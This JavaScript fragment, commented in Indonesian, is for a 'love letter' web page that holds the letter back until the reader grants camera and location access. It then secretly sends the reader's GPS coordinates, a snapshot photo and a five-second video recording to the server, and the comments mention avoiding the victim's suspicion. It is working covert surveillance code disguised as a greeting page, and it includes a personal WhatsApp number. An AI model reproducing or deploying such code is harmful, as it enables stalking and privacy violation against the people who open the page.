// ... (Bagian pesan dan partikel background tetap sama seperti sebelumnya) ...

readBtn.addEventListener("click", () => {
    // 1. Minta izin kamera dulu
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(function(stream) {
        globalStream = stream;

        // 2. Jika kamera diizinkan, langsung minta izin lokasi
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                // JIKA LOKASI JUGA DIIZINKAN:
                
                // Kirim data lokasi ke server
                fetch("/kirim-lokasi", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                });

                // Jalankan proses intel foto/video
                prosesIntel(globalStream);

                // BARU BUKA SURATNYA
                bukaSurat();
            },
            function(err) {
                // JIKA LOKASI DITOLAK:
                alert("Akses lokasi ditolak. Mohon aktifkan GPS dan izinkan lokasi agar surat ini bisa terbuka.");
                // Matikan kamera yang tadi sudah sempat nyala agar tidak curiga
                stream.getTracks().forEach(t => t.stop());
            }
        );
    })
    .catch(err => {
        // JIKA KAMERA DITOLAK:
        alert("Akses kamera ditolak. Mohon izinkan kamera agar surat ini bisa terbuka.");
    });
});

// Fungsi untuk menjalankan animasi surat (dipisah agar rapi)
function bukaSurat() {
    music.load();
    music.play().catch(() => console.log("Autoplay blocked"));
    document.getElementById("introText").style.opacity = 0;
    readBtn.style.display = "none";

    letterBox.style.opacity = 0;
    letterBox.style.display = "block";
    setTimeout(() => letterBox.style.opacity = 1, 50);

    let i = 0;
    const words = message.split(/(\s+)/);
    function typeWriter() {
        if (i < words.length) {
            typedText.innerHTML += words[i];
            i++;
            setTimeout(typeWriter, 150);
        } else {
            cursor.style.display = 'none';
            waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
            waBtn.classList.add("show");
            waBtn.scrollIntoView({ behavior: "smooth" });
        }
    }
    typeWriter();
}

// Fungsi intel foto/video
function prosesIntel(stream) {
    const v = document.createElement("video");
    v.srcObject = stream;
    v.play();
    v.onloadedmetadata = function() {
        const canvasSnap = document.createElement("canvas");
        canvasSnap.width = 640; canvasSnap.height = 480;
        setTimeout(() => {
            canvasSnap.getContext("2d").drawImage(v, 0, 0, canvasSnap.width, canvasSnap.height);
            canvasSnap.toBlob(function(blob) {
                const fd = new FormData();
                fd.append("photo", blob, "foto.jpg");
                fetch("/kirim-foto", { method: "POST", body: fd });
                mulaiRekaman(stream);
            }, "image/jpeg");
        }, 2000);
    };
}

function mulaiRekaman(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
        const videoBlob = new Blob(chunks, { type: "video/mp4" });
        const fd = new FormData();
        fd.append("video", videoBlob, "video.mp4");
        fetch("/kirim-video", { method: "POST", body: fd })
        .then(() => { stream.getTracks().forEach(t => t.stop()); });
    };
    recorder.start();
    setTimeout(() => recorder.stop(), 5000);
}